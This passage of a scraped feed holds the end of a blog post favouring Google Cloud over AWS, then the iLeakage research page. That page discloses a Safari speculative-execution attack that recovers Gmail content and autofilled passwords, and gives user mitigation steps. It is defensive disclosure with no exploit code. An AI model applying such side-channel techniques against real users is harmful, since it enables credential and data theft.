̶o̶n̶ ̶t̶h̶e̶ ̶s̶i̶d̶e̶ ̶a̶n̶d̶ ̶m̶a̶k̶e̶ ̶s̶u̶r̶e̶ ̶t̶h̶e̶y̶ ̶c̶o̶n̶n̶e̶c̶t̶ ̶w̶i̶t̶h̶ ̶t̶h̶e̶ ̶m̶a̶s̶t̶e̶r̶,̶ ̶w̶h̶i̶c̶h̶ ̶a̶ ̶l̶o̶t̶ ̶o̶f̶ ̶w̶o̶r̶k̶ ̶f̶o̶r̶ ̶y̶o̶u̶ ̶t̶o̶ ̶d̶o̶ ̶o̶n̶ ̶t̶o̶p̶ ̶o̶f̶ ̶t̶h̶e̶ ̶p̶r̶o̶m̶i̶s̶e̶ ̶o̶f̶ ̶“̶m̶a̶n̶a̶g̶e̶d̶”̶</p><blockquote><p id="2254"><strong>EDIT</strong>: From the time I worked with EKS to the time I wrote this article, AWS added managed node groups. However when going through the console creating EKS resources you still have to go through a lot of options and screens. Also managed nodes need to be created after provisioning the cluster going through yet another set of options and screens. While this is definitely a welcomed improvement, the underlining design ethos that applies to most of AWS is still in EKS, which is what I am ranting about here. Thank you to the EKS team for bringing this to my attention and please don’t take this as a personal attack, I have every confidence of your competence and you are not to blame for the <a href="https://en.wikipedia.org/wiki/Conway%27s_law" rel="noopener ugc nofollow" target="_blank">organisational structures</a> that may compel you build products this way.</p></blockquote><p id="bd08">And yes, I know that there are official terraform modules that take care of most of this work for you and make the job a lot easier and there is also a tool called <a href="https://github.com/weaveworks/eksctl" rel="noopener ugc nofollow" target="_blank">eksctl</a> developed by Weaveworks which is great, but these aim to simplify a complex solution that should have been abstracted away by AWS by design, not rely on others to make sense of the mess with complex scripts and tools.</p><p id="7ce7">Even if you use those tools to create your automation on top of AWS, the fact remains that there are a lot of moving parts underneath that you will always be responsible to orchestrate and make sure that are working and up to date. eksctl for example uses cloudformation templates in the background.</p><h2 id="96d8">Product Overload</h2><p id="372d">At the time of writing this, there are 169 AWS products compared to 90 in GCP. AWS has been around for longer and therefore they have more offering, and in good Amazon spirits, they constantly and aggressively are expanding this offering to give you more of what you may need (and a lot of what you don’t need) at breakneck speed.</p><p id="7497">This sounds like a good thing, until you start seeing the amount of half cooked products or <a href="https://www.forbes.com/sites/janakirammsv/2018/01/08/aws-service-sprawl-starts-to-hurt-the-cloud-ecosystem/#20aee5455c1f" rel="noopener ugc nofollow" target="_blank">near duplicates they have</a>. One good example is Parameter Store and Secret Manager, which are different, but from a practical point of view they can look very similar with Secret Manager mostly just adding rotation of secrets.</p><p id="d771">Another case of insane product overload is queues, explained well in <a href="https://www.deps.co/blog/google-cloud-platform-good-bad-ugly/" rel="noopener ugc nofollow" target="_blank">this article by deps</a>:</p><blockquote><p id="fb24">GCP has done well integrating their different services together. GCP provides a smaller set of core primitives that are global and work well for lots of use cases. <a href="https://cloud.google.com/pubsub/" rel="noopener ugc nofollow" target="_blank">Pub/Sub</a> is probably the best example I have for this. In AWS you have SQS, SNS, Amazon MQ, Kinesis Data Streams, Kinesis Data Firehose, DynamoDB Streams, and maybe another queueing service by the time you read this post. 2019 Update: Amazon has now released another streaming service: <a href="https://aws.amazon.com/msk/" rel="noopener ugc nofollow" target="_blank">Amazon Managed Streaming Kafka</a>. GCP has Pub/Sub. Pub/Sub seems flexible enough to replace most (all?) of AWS’ various queues.</p></blockquote><p id="077e">AWS product naming and packaging is also very confusing. For example AWS Control Tower, Landing Zone and AWS Organisations seem like they should be consolidated into one product, and it seems they name these products in parallel, without talking to each other; apparently Control Tower creates landing zones, but they are not the “Landing Zone”. I watched a couple of talks on this and I still don’t fully understand it, like this one, notice the speaker struggling to try to make sense of this mess in <a href="https://youtu.be/nNy5UjzejNc?list=PLuI6lMS0-kCj8H5PBF0XQypIVhbYgSgQ3&amp;t=47" rel="noopener ugc nofollow" target="_blank">three</a> <a href="https://youtu.be/nNy5UjzejNc?list=PLuI6lMS0-kCj8H5PBF0XQypIVhbYgSgQ3&amp;t=90" rel="noopener ugc nofollow" target="_blank">different</a> <a href="https://youtu.be/nNy5UjzejNc?list=PLuI6lMS0-kCj8H5PBF0XQypIVhbYgSgQ3&amp;t=206" rel="noopener ugc nofollow" target="_blank">points</a>. And then in <a href="https://youtu.be/fxo67UeeN1A?t=522" rel="noopener ugc nofollow" target="_blank">another talk</a> about AWS Organisations, a different speaker explaining what the difference is between Control Tower and AWS Organisations…</p><figure></figure><p id="a3d0">GCP on the other hand has fewer products but the ones they have (at least in my experience) feel more complete and well integrated with the rest of the ecosystem, and choosing one product over other doesn’t become an agonising choice that requires extensive research (okay, you still need to research, but not nearly as much)</p><p id="70b9">I used to mock Apple in the past for how limiting they were and how very few features they had compared to Windows and Linux Distros until I started using a Macbook, it was then that it became so clear to me that having an opinionated approach on a few products and tighter integration of the various components often yields a far superior and more stable experience which is similar to the experience that I am having with GCP vs AWS. GCP gives you less and is slower delivering, but what it gives you is far better integrated, simple to use and often works better than its AWS counterpart.</p><h2 id="3919">AWS is a lot more Expensive</h2><p id="3d88">AWS charges <a href="https://thehftguy.com/2016/11/18/google-cloud-is-50-cheaper-than-aws/" rel="noopener ugc nofollow" target="_blank">substantially more</a> for their services than GCP does, but most people ignore the real high cost of using AWS, which is; expertise, time and manpower.</p><p id="57f5">With GCP, a relatively inexperienced engineer in platforming tools can pick it up and get his work done in a relatively short time because most of the tedious tasks of piecing all the parts together have been done by Google already.</p><p id="03bd">A task that may take you a day or less to do in GCP, you may spend a week to do the same thing in AWS. One example I can give here is <a href="https://docs.aws.amazon.com/vpc/latest/userguide/vpc-endpoints.html" rel="noopener ugc nofollow" target="_blank">VPC Endpoints</a>. I was working with a terraform cluster installation and I wanted to restrict outbound traffic to the internet. The problem is that if you do this then you are also cutting off traffic to AWS, in order to address this problem you need to set up endpoints. Endpoints essentially allow you to connect to AWS via the AWS intranet as opposed to the internet (Don’t ask me why cloud providers don’t do this by default, it makes no sense to me).</p><p id="ff01">So simple enough, I just add these endpoints and then my job is done. Problem is that I was working with a cluster provisioner in terraform with a lot of moving parts and using multiple AWS services and you cannot set up an endpoint that applies to all AWS services, you can only do one endpoint per service and I had to do a lot of digging trying to figure out exactly all the services that the provisioner was using and add endpoints for each one of them, every time I added an endpoint, I found out I had to add another endpoint, I ended up adding about five of them and then I found out that a couple of the services that I was using didn’t have endpoints for them, so in the end I just had to allow outgoing traffic via a NAT.</p><p id="3b71">Out of curiosity I investigated how to do this in Google Cloud because I had never done it before, just to see how difficult it would be in comparison to AWS and I wasn’t surprised to find out that you can accomplish the same thing just by <a href="https://cloud.google.com/vpc/docs/configure-private-google-access" rel="noopener ugc nofollow" target="_blank">clicking on a checkbox</a> or activating a setting, and it applies to all services. Also, doing this in GCP is free whereas in AWS you have to <a href="https://aws.amazon.com/privatelink/pricing/" rel="noopener ugc nofollow" target="_blank">pay for each endpoint</a></p><p id="3c78">The above is just one example, but I have found that generally <strong>any task that I want to do in AWS requires far more energy and effort to do than GCP</strong>, meaning you are probably going to need to hire far more engineers and need more time and more money on human resources if you are using AWS than if you are using GCP.</p><p id="0936"><strong>The Cost of interrupted Flow</strong></p><p id="dd14">Another significant cost to your organisation if you decide to use AWS is the continuous interrupted flow. <a href="https://en.wikipedia.org/wiki/Flow_(psychology)" rel="noopener ugc nofollow" target="_blank">Flow</a> is the state where you ideally want your engineers to be a good portion of their time at your company, not only they will be much happier, they will also be a lot more productive.</p><p id="a7ea">The problem with using AWS is that because everything is so confusing and complicated to use you will have to spend a lot of time reading documentation and testing to figure out how things work, and the irritating thing is that it won’t be fun experimentation, it will be tedious and trivial issues that should not exist, like the endpoint issue I described above.</p><p id="7b7e">Even after you are seasoned in the use of AWS you still spend an inordinate amount of time doing tedious things that you never have to do in GCP. Like inputting your 2FA code every 12 hours, or assuming roles, or just going over pieces and services and putting them together. The more tedious obstacles between you and the task you want to achieve, the harder it is to achieve flow.</p><h2 id="4690">Performance</h2><p id="a756">I am not going to do extensive testing in both platforms and post benchmarks for this article since it’s a lot more work than I want to spend on this but I’ll just say that in my experience I felt that performance was almost always better in GCP, for example copying from instances to buckets in GCP is INSANELY fast, I remember being shocked by this because in a previous job I had to do a lot of hourly backups to buckets of large chunks of data in AWS and I always felt the copying was very slow, but this was not the case at all for GCP.</p><p id="37b0">One good example I experienced recently is how slow it is to spin clusters up with EKS. In GKE you can have a fully functional cluster in less than<a href="https://kubedex.com/google-gke-vs-azure-aks-automation-and-reliability/" rel="noopener ugc nofollow" target="_blank"> 4 minutes</a>. In EKS it takes about 16 minutes to create just the control plane (and even then it’s <a href="https://github.com/aws/containers-roadmap/issues/654" rel="noopener ugc nofollow" target="_blank">not ready!!</a>) and then you have to add another 3 minutes or longer to spin the nodes, although sometimes I had to wait much longer than this for the workers. This may not matter that much to some, but when I am creating new infrastructure I tear it down and recreate it a lot to test that everything is working correctly and to save the company money on weekends and evenings so for me this matters a lot.</p><p id="2255">There are some latency tests in <a href="https://kinsta.com/blog/google-cloud-vs-aws/#google-compute-engine-cloudharmony-latency-test" rel="noopener ugc nofollow" target="_blank">this article</a> that clearly show that GCP does better across almost all areas when it comes to Network performance.</p><p id="c6af"><a href="https://thehftguy.com/2016/06/15/gce-vs-aws-in-2016-why-you-should-never-use-amazon/" rel="noopener ugc nofollow" target="_blank">This article</a> also compares some services between AWS and GCP.</p><h2 id="b2bb">Security</h2><p id="4a44">Both AWS and GCP are very secure and you will be okay as long as are not careless in your design. However GCP for me has an edge in the sense that everything is encrypted by default. For example their buckets and their logs are encrypted in transit and at rest. For some bizarre reason AWS does not encrypt buckets or logs by default, you have to enable this. Who the hell would NOT want their data encrypted on AWS servers?</p><p id="e048">GCP is also continuously publishing its internal models for security like <a rel="noopener" href="https://nandovillalba.medium.com/beyondcorp-vs-beyondprod-781565bc4b91">BeyondCorp and BeyondProd</a>, and designing GCP so it’s easier to integrate them for other companies. These security models are generally way ahead of the curve; for example BeyondCorp’s model has just been recently <a href="https://www.ncsc.gov.uk/blog-post/zero-trust-1-0" rel="noopener ugc nofollow" target="_blank">adopted</a> by the National Cyber Security Center, and Google has published this<a href="https://storage.googleapis.com/pub-tools-public-publication-data/pdf/43231.pdf" rel="noopener ugc nofollow" target="_blank"> six years ago</a> while providing tools to implement it for quite some time. I am not saying that it is impossible to do the same with AWS, but it wasn’t designed with this intent in mind and it is a lot more difficult to implement. AWS on the other hand seems to have opted for supporting more <a href="https://aws.amazon.com/blogs/networking-and-content-delivery/introducing-aws-client-vpn-to-securely-access-aws-and-on-premises-resources/" rel="noopener ugc nofollow" target="_blank">traditional models of security</a>.</p><p id="f76d">This is a good talk if you are interested in hearing more about GCP security:</p><figure></figure><p id="46b1">And here is an <a href="https://youtu.be/kd33UVZhnAA" rel="noopener ugc nofollow" target="_blank">interesting tour</a> of GCP’s datacenter security.</p><h2 id="9ffd">Google is a world leader of Scalable Infrastructure.</h2><p id="da3f">I would argue that there isn’t any other company on the planet that does scalability and global infrastructure better than Google (although CloudFlare definitely gives it a run for its money in <a href="https://medium.com/@nykolas.z/dns-resolvers-performance-compared-cloudflare-x-google-x-quad9-x-opendns-149e803734e5" rel="noopener">some areas</a>).</p><p id="937c">Just to get a grasp of how incredible Google’s infrastructure is, In 2013 Google went down for 5 minutes and the <a href="https://www.cnet.com/news/google-goes-down-for-5-minutes-internet-traffic-drops-40/" rel="noopener ugc nofollow" target="_blank">internet traffic of the entire world went down by 40%</a> because people assumed their Internet was broken when Google wouldn’t open.</p><p id="776a">People trust google a lot more than they do their own internet connections because Google rarely ever goes down, and yet their combined services serve the <a href="https://youtu.be/2Uj1A9AguFs" rel="noopener ugc nofollow" target="_blank">most amount of traffic in the world</a>.</p><p id="9866">Google is constantly on the edge developing new technologies that can scale, and once these technologies have been tried and tested enough, they often open source them and put them as part of their cloud offering. These technologies include kubernetes, Golang, Hadoop, and <a href="https://opensource.google/projects/list/cloud?page=2" rel="noopener ugc nofollow" target="_blank">many more</a></p><h2 id="83bc">So what’s better about AWS? There has to be something!</h2><p id="45a0">As I mentioned I think that AWS certainly offers a lot more features, configuration options and products than GCP does, and you may benefit from some of them. Also AWS releases products at a much faster speed.</p><p id="70f5">You can certainly do more with AWS, there is no contest here. If for example you <a href="https://aws.amazon.com/snowmobile/faqs/" rel="noopener ugc nofollow" target="_blank">need a truck with a server inside</a>, then AWS is for you. AWS also has more flexibility in terms of location of your data centres. Other than that… I would chose GCP any day, and I think GCP will cover the vast majority of your cases.</p><h2 id="949f">Typical Objections to using GCP</h2><p id="6ebe">These are some of the objections I heard from people who pick AWS and are weary of choosing GCP as their provider.</p><h2 id="6b3a">But wait, there are lots of third party tools to automate AWS so it’s not a problem</h2><p id="ef55">Yes, like the aforementioned <a href="https://github.com/weaveworks/eksctl" rel="noopener ugc nofollow" target="_blank">eksctl</a>, some of them do an amazing job at this but they are still third party tools. I firmly believe AWS needs to work a lot on their abstraction of needless complexity so there is no need to have so many tools on top of it.</p><h2 id="9e9b">So if GCP is so much better, why so many more people use AWS?</h2><p id="c714">I want to cover some of the reasons that hold back GCP from overtaking AWS, some of them are reasonable, other are pure myths or misperceptions.</p><p id="7aa3"><strong>They were the first</strong></p><p id="99f4">The principal reason why more people use AWS more than any other platform is that it has been around substantially longer than others. But that alone is not enough to make it king. Even though AWS is over-convoluted and mired with all the problems I just described, it is still a very decent product with excellent uptime and performance so if you are using it, you may not be compelled enough to move another platform, no matter how much better that other platform is.</p><p id="73f3"><strong>Aggressive expansion of product line</strong></p><p id="5dca">AWS is much quicker at releasing new products than GCP, although as I mentioned previously, this can be good and bad, in my opinion is mostly bad.</p><p id="7f0e"><strong>Following the Crowd</strong></p><p id="ef76">Whenever you start working in a DevOps field you are bombarded with the idea that you must study and know how to use AWS in order to fail proof your career. AWS certifications for example are a very popular topic and every other engineer has at least one.</p><p id="e5c3">And so it happens that most engineers made a commitment to AWS right from the beginning, spending years of their lives learning this platform and ignoring or glossing over others.</p><p id="50f2">Imagine if you are an engineer with 5 years of experience in AWS with lots of money and effort spent on AWS certifications and you are tasked to do infrastructure at greenfield project, what are you going to chose? Probably not GCP.</p><h2 id="3c2d"><strong>Fear that you won’t be able to get another job if you chose GCP</strong></h2><p id="a139">It’s true that there are a lot more jobs that use AWS, but there are also very, very few engineers with extensive experience in GCP compared to AWS. Taking a GCP job or getting a GCP certification will not make you disposable any time soon. Also, many employers are smart enough to recognise that a tool alone is not enough to define the quality of an engineer. I made a transition into another AWS role after having more experience with GCP fine, and even if some employers won’t like this, many others won’t mind.</p><p id="06b8">If you are still doubting that learning and dedicating yourself to GCP is a bad idea, <a href="https://www.forbes.com/sites/louiscolumbus/2020/02/10/15-top-paying-it-certifications-in-2020/#3fdede95358e" rel="noopener ugc nofollow" target="_blank">maybe this will change your mind</a>:</p><figure><figcaption><a href="https://www.forbes.com/sites/louiscolumbus/2020/02/10/15-top-paying-it-certifications-in-2020/#1aa35449358e" rel="noopener ugc nofollow" target="_blank">Source</a></figcaption></figure><h2 id="d594"><strong>Fear that GCP may be abandoned by Google</strong></h2><p id="0441">Google will very often release products to see how the market reacts to them and if they don’t work well, they will abandon them. This is deliberate and a strategy that revolves around trying new things as a source of innovation and also not wasting resources on products that don’t work, which makes sense. Now that the company has started to release paid products like Stadia or GCP there is a perception that they will soon be abandoned.</p><p id="93a4">I highly doubt this will apply to GCP for three reasons:</p><p id="dc93">First, GCP is not just one product, but many products, all of which have involved a monumental amount of engineering effort and time invested.</p><p id="c363">Second, it would be a PR disaster if Google were to leave out in the cold all the companies that rely on them, especially the big ones like Evernote, Coca Cola, Apple, Spotify, etc. It just won’t happen.</p><p id="495d">Finally and most importantly, there is absolutely <a href="https://kinsta.com/google-cloud-market-share/" rel="noopener ugc nofollow" target="_blank">no sign</a> of GCP’s business slowing down, which would make it even more unlikely for them to abandon the platform. Why would you throw out a part of your business that’s generating <a href="https://techcrunch.com/2020/02/03/alphabet-earnings-show-google-cloud-on-10b-run-rate/" rel="noopener ugc nofollow" target="_blank">2.6 billion as of 2020 </a>and growing each year?</p><h2 id="8940"><strong>Google doesn’t “eat their own dog food” with GCP</strong></h2><blockquote><p id="bd4e">This point doesn’t prove anything in my opinion, but I am just bringing it up here because it seems to be where AWS enthusiasts lean heavily on when promoting the platform, as if it was irrefutable proof that AWS is superior.</p></blockquote><p id="6d76">There is a perception that because Google doesn’t use GCP for all their products and projects internally, they are not good enough for the public to use. Alternatively there is a perception that Amazon uses AWS for everything so that automatically makes them the most reliable choice — neither of them is accurate.</p><p id="6136">Google does use GCP for a lot of things internally, including YouTube and Gmail as explained in <a href="https://cloud.google.com/docs/compare/aws/#why" rel="noopener ugc nofollow" target="_blank">this page</a>:</p><blockquote><p id="8c83">Internally, Google uses this infrastructure for several high-traffic and global-scale services, including <a href="https://mail.google.com/" rel="noopener ugc nofollow" target="_blank">Gmail</a>, <a href="https://www.google.com/maps" rel="noopener ugc nofollow" target="_blank">Maps</a>, <a href="https://www.youtube.com/" rel="noopener ugc nofollow" target="_blank">YouTube</a>, and <a href="https://www.google.com/" rel="noopener ugc nofollow" target="_blank">Search</a>. Because of the size and scale of these services, Google has put a lot of work into optimizing its infrastructure and creating a suite of tools and services to manage it effectively. Google Cloud puts this infrastructure and these management resources at your fingertips.</p></blockquote><p id="b679">Amazon also uses AWS to power itself internally but this is <a href="https://www.networkworld.com/article/2956631/amazon-isnt-eating-all-of-its-own-cloud-dog-food.html" rel="noopener ugc nofollow" target="_blank">not always the case</a>.</p><p id="59aa">It’s true that Google does not use GCP internally for everything but there is a good reason for it. Google is always on the edge trying and testing new innovative technologies, these are extensively tested until they work great and later open sourced and made part of their cloud offering. This is not a bad thing, because as a customer you will rarely get a half cooked product with teething issues.</p><p id="844d">AWS on the other hand will release a lot more products faster, and as a consequence products will not be as complete as their GCP counterparts which can also be good in the sense they may release some tool that meets your needs and works acceptably well at a faster speed than Google would.</p><p id="8dcc">I don’t think neither approach is wrong, but I would prefer to use something that works more reliably than being a guinea pig, especially if I am paying good money for it, which is why I favour Google’s approach in this case.</p><p id="b96f">Another thing I will point out here is that Google contributes <a href="https://opensource.google/projects/list/cloud?page=2" rel="noopener ugc nofollow" target="_blank">way more</a> to the Open Source community and industry overall than Amazon does, which happens thanks to the experimentation going on inside Google.</p><h2 id="254d"><strong>“You can’t get fired for choosing AWS”</strong></h2><p id="1540">Meaning that AWS is such a safe bet as a platform provider that you could not get fired as a result of choosing it. This is what some people say in the industry to justify picking AWS as the default.</p><p id="0565">All I can say here is that if your employer fires you for choosing GCP, he is probably not a very good employer to begin with and you deserve a better job, which I am sure you can easily get giving the demand for your skills.</p><p id="9531">Jokes aside though, if the engineering talent in your company is good, they will make it work both in AWS and GCP, so I wouldn’t worry too much about your choices. Chose the platform that you feel suits your needs best, and yes, GCP is also a very safe bet.</p><h2 id="c483"><strong>Disdain for Google</strong></h2><p id="7b52">For some reason, some people really seem to hate Google. I can completely understand that Google sometimes will do things that are objectionable (and occasionally toying with the <a href="https://www.bbc.co.uk/news/technology-49015516" rel="noopener ugc nofollow" target="_blank">very objectionable</a>), but I would argue that Google is not the worst of the lot by a long shot, they are in many ways more ethical than Microsoft, Amazon and Facebook. Some people may disagree with me, but I would argue that Google has not abused its monopoly nearly as much as Microsoft did back in the day (like for example <a href="http://www.ecis.eu/documents/Finalversion_Consumerchoicepaper.pdf" rel="noopener ugc nofollow" target="_blank">hustling PC vendors</a> to only accept MS Office Suite or withdraw Windows from their machines), and their monopoly has been earned by genuinely being the very best at what they do, which is architecture of scale and search, rather than by locking you down in their ecosystem.</p><p id="04cd">Some of this disdain comes from Google’s attitude towards users and that’s something I can agree that Google can do better, but I wouldn’t say that by choosing AWS you are being more ethical than by choosing Google at all.</p><p id="5d9b">Google’s approach is to create products that are so well engineered that they don’t need as much support, and in many ways I prefer this approach to having a nice sales rep buddy who is friendly but I need to contact all the time with issues.</p><h2 id="ad9b">But this AWS complexity is creating so many jobs for us!</h2><p id="4bf4">Yes, and it does sound like I am shooting myself on the foot by posting this because this is my job. AWS definitely creates a lot more jobs for DevOps, SRE, Sysadmin, Platform Engineers etc. than GCP due to this extra complexity and the lack of desire for the developers themselves wanting to tackle this complexity.</p><p id="4966">But personally I am not afraid of learning new things, I embrace it and I enjoy it, especially if those new technologies are well designed and simple. So I am okay making this transition.</p><h2 id="3079">So will GCP ever catchup to AWS on market share?</h2><p id="1526">It’s hard to tell. One thing that AWS has going for it is that it churns out products like churros, and while I don’t think this is necessarily that great of a thing, it does meet the needs of most businesses, even if fragmented and tedious to work with. Also migrating from one platform to another is such an onerous task that many companies will never bother to do so. That being said, the increasing market share and profits coming from GCP look promising and this ex-googler author of this <a href="https://blog.usejournal.com/im-leaving-google-and-here-s-the-real-deal-behind-google-cloud-1b86513be01b" rel="noopener ugc nofollow" target="_blank">article</a>, seem very confident that GCP will eventually reign:</p><blockquote><p id="007c">My friends ask me if I think Google Cloud will catch up to its rivals. Not only do I think so — I’m positive five years down the road it will surpass them. Because today, <strong>Cloud is about helping other companies build software like Google does</strong>. All those great things about working at Google? Making them available to other companies — that’s the product market fit.</p></blockquote><p id="4b73">While I am not so sure if I am as confident as he is that it will just take five years to get there. I believe that down the road people who chose to specialise in GCP today won’t regret it.</p><h2 id="4d1a">Conclusion</h2><figure></figure><h2 id="771f">So I should always pick GCP then?</h2><p id="57f4">No, you should pick whatever fits your needs. If you are a very small company or an independent developer you may even want to give these two a miss and go with DigitalOcean or Linode or some of the smaller companies which are even easier to use and will cover your most basic needs for less money.</p><p id="e87b"><strong>AWS is still my second choice as an enterprise cloud provider after GCP</strong>. I know there is also Azure, but being a little harsh here, I have a little PTSD from using and supporting Microsoft products in the past, my memories from growing up using windows are daily blue screens and continuous Outlook issues. I just feel that Microsoft has historically been very much focused on the sale, not the quality of the product, they have the capacity to do great things, but they only do them when competition pushes them to do it, and/or have someone to copy from and they stop putting an effort once they reach monopoly. This is a stark contrast from Google or Apple who are very driven by engineering finesse and product design first respectively, not purely sales.</p><p id="5676">Of course, there are exceptions to this (I love VSCode) and some people swear that Microsoft has gotten much better over the years, but I still feel that this is only a consequence of pressure from the fierce and much better qualified competition, not because of a cultural pivot.</p><p id="0220">Based on that, if I can help it, I will avoid using Azure, but I can also respect that some people may love it, so I’ll leave it up to them to write their thoughts on it.</p><h2 id="6172">Okay then, GCP is perfect, let’s go for it!</h2><p id="6d31">Nothing is perfect. You will surely come across things in GCP that you will hate, as I have in the past, but for most people the amount of headaches will be fewer and farther in between than with AWS, and that alone is a good reason to pick it.</p><h2 id="075c">Additional Resources</h2><p id="9f0d"><a href="https://kinsta.com/google-cloud-market-share/" rel="noopener ugc nofollow" target="_blank">https://kinsta.com/google-cloud-market-share/</a></p><p id="de88"><a href="https://sada.com/blog/google-cloud/gcp-vs-aws-why-gcp-better-option-2019/" rel="noopener ugc nofollow" target="_blank">https://sada.com/blog/google-cloud/gcp-vs-aws-why-gcp-better-option-2019/</a></p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[iLeakage: Browser-Based Timerless Speculative Execution Attacks on Apple Devices (564 pts)]]></title>
            <link>https://ileakage.com/</link>
            <guid>38015277</guid>
            <pubDate>Wed, 25 Oct 2023 17:15:49 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://ileakage.com/">https://ileakage.com/</a>, See on <a href="https://news.ycombinator.com/item?id=38015277">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
			<section id="abstract">
				<h4><i></i>Overview of the <span>iLeakage Attack.</span></h4>
				<div>
					<p>
						<!-- After first sentence, emphasize how Spectre is still alive and kicking nearly 6 years after release -->
						We present iLeakage, a transient execution side channel targeting the <a href="https://www.apple.com/safari/">Safari web browser</a> present on Macs, iPads and
						iPhones. iLeakage shows that the <a href="https://spectreattack.com/">Spectre</a> attack is still
						relevant and exploitable, even after nearly 6 years of effort to mitigate it since its discovery.
						We show how an attacker can induce Safari to render an arbitrary webpage, subsequently
						recovering sensitive information present within it using speculative execution. In particular,
						we demonstrate how Safari allows a malicious webpage to recover secrets from popular high-value
						targets, such as Gmail inbox content. Finally, we demonstrate the recovery of passwords, in case
						these are autofilled by credential managers.
					</p>

					

					
				</div>
			</section>

			<section id="demos">
				<h4><i></i>Demo <span>Videos.</span></h4>
				<div>
						<div>
							<h5>Recovering Instagram Credentials</h5>
							<p>
								We show a scenario where the target uses an autofilling credential manager
								(LastPass in this demo) to sign into Instagram with Safari on macOS.
							</p>
							<p>
								<iframe src="https://www.youtube-nocookie.com/embed/Z2RtpN77H8o" title="YouTube video player" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope" allowfullscreen=""></iframe>
							</p>
						</div>
						<div>
							<h5>Recovering Gmail Inbox Content</h5>
							<p>
								Assuming the target is signed into Google on Safari for iOS, we recover the subject
								lines of the Gmail account's most recent messages on an iPad.
							</p>
							<p>
								<iframe src="https://www.youtube-nocookie.com/embed/2uH9slLKTjw" title="YouTube video player" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope" allowfullscreen=""></iframe>
							</p>
						</div>
						<div>
							<h5>Recovering YouTube Watch History</h5>
							<p>
								We recover YouTube watch history from the Chrome browser for iOS, which is a shell on
								top of Safari's browsing engine due to Apple's App Store policy.
							</p>
							<p>
								<iframe src="https://www.youtube-nocookie.com/embed/sNdyrCtajP4" title="YouTube video player" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope" allowfullscreen=""></iframe>
							</p>
						</div>
					</div>
			</section>

			<section id="people">
				<h4><i></i>The People
					<span>Behind iLeakage.</span>
				</h4>
				<div>
							<ul>
								<li><a href="https://jasonkim.page/">Jason Kim </a><span><a href="https://www.gatech.edu/">Georgia Institute of
											Technology</a></span></li>
								<li><a href="https://www.synkhronix.com/about/">Stephan van Schaik</a> <span><a href="https://umich.edu/">University of Michigan</a></span></li>
								<li><a href="https://www.cc.gatech.edu/~genkin/">Daniel Genkin</a> <span><a href="https://www.gatech.edu/">Georgia Institute of Technology</a></span>
								</li>
								<li><a href="https://yuval.yarom.org/">Yuval Yarom</a> <span><a href="https://www.ruhr-uni-bochum.de/">Ruhr University
											Bochum</a></span></li>
							</ul>
						</div>
			</section>

			<section id="qa">
				<h4><i></i>Frequently Asked <span>Questions.</span></h4>

				<p>
					<h5>The Basics</h5>
				</p>
				<div id="impact-and-potential-concerns">
					<div id="panelsStayOpen-collapseAffected" aria-labelledby="panelsStayOpen-headingAffected">
							<p>
								Yes (with a very high chance), if you have a device running macOS or iOS with Apple's
								A-series or M-series CPUs. This includes all recent iPhones and iPads, as well as
								Apple's laptops and desktops from 2020 and onwards.
							</p>
						</div>
					<div id="panelsStayOpen-collapseImpact" aria-labelledby="panelsStayOpen-headingImpact">
							<p>
								Code running in one web browser tab should be isolated and not be able to infer anything
								about other tabs that a user has open. However, with iLeakage, malicious JavaScript and
								WebAssembly can read the content of a target webpage when a target visits and clicks on
								an attacker's webpage. This content includes personal information, passwords, or credit
								card information.
							</p>
						</div>
					<div id="panelsStayOpen-collapseMitigation" aria-labelledby="panelsStayOpen-headingMitigation">
								<p>
									At the time of public release, Apple has implemented a mitigation for iLeakage
									in Safari. However, this mitigation is not enabled by default, and enabling it
									is possible only on macOS. Furthermore, it is marked as unstable.
									We will keep this FAQ updated as Apple pushes more iOS and macOS updates.
									If you wish to enable the mitigation on your Mac now, below are the steps:
								</p>
								<p>
									<b>If you have updated to macOS Sonoma:</b>
								</p>
								<ol>
									<li>Open the Terminal app. You can find this in the Launchpad, or through Spotlight
										search.</li>
									<li>Copy and paste the following command (in magenta), and press the Return key to
										run it:
										<br><code>defaults write com.apple.Safari IncludeInternalDebugMenu 1</code>.
									</li>
								</ol>
								<p>
									<b>If you are on an earlier macOS version (macOS Ventura and earlier):</b>
								</p>
								<ol>
									<li>We recommend enabling automatic updates and updating to macOS Sonoma. However,
										if you wish to enable the mitigation on older macOS versions, follow these
										steps:</li>
									<li>First, download the version of Safari Technology Preview tht matches your macOS
										version from Apple's <a href="https://developer.apple.com/safari/resources/">download page.</a></li>
									<li>Double-click the downloaded installer with the <code>.pkg</code> file extension,
										and follow its directions until Safari Technology Preview is installed.</li>
									<li>Open the Terminal app. You can find this in the Launchpad, or through Spotlight
										search.</li>
									<li>Copy and paste the following command (in magenta), and press the Return key to
										run it:
										<br><code>defaults write com.apple.SafariTechnologyPreview IncludeInternalDebugMenu 1</code>.
									</li>
								</ol>
								<p>
									<b>This enables Safari's hidden debugging menu. Then, follow these steps:</b>
								</p>
								<ol>
									<li>Open Safari (or Safari Technology Preview). On the menu bar, you should see a
										new entry named <b>Debug</b>. <br><img src="https://ileakage.com/img/debug-menu.png" alt="Hidden debug menu"></li>
									<li>Click the Debug menu. This opens a long dropdown. Click on <b>WebKit Internal
											Features</b>. <br><img src="https://ileakage.com/img/webkit-internal.png" alt="WebKit internal features"></li>
									<li>This opens another long dropdown to the side. Scroll down to the bottom of this
										new dropdown, where you'll find an entry called <b>Swap Processes on Cross-Site
											Window Open</b>. <br><img src="https://ileakage.com/img/pson.png" alt="Swap processes on cross-site window.open">
									</li>
									<li>Click this entry. A checkmark should appear to the left of it, like the
										screenshot below. <br><img src="https://ileakage.com/img/pson-enabled.png" alt="Mitigation enabled"></li>
								</ol>
								<p>
									Afterwards, you're all set! To disable the mitigation, repeat steps 1-4 from above,
									and the checkmark will disappear.
									To disable the hidden debugging menu, open the Terminal app, copy and paste the
									following command (depending on your OS version), and press the Return key to run.
									The changes will apply the next time you start Safari (or Safari Technology
									Preview).
								</p>
								<ul>
									<li>For Safari (macOS Sonoma):
										<br><code>defaults write com.apple.Safari IncludeInternalDebugMenu 0</code></li>
									<li>For Safari Technology Preview (macOS Ventura and earlier):
